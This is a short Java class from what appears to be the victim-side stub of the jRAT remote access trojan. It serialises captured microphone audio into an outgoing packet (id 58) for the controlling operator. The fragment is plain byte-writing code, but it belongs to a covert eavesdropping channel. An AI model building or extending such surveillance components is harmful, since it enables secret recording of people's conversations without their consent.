package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet58ClientUploadSoundCapture extends AbstractOutgoingPacket {

	private byte[] data;
	private int read;
	
	public Packet58ClientUploadSoundCapture(byte[] data, int read) {
		this.data = data;
		this.read = read;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(read);
		dos.write(data);
	}

	@Override
	public byte getPacketId() {
		return 58;
	}

}
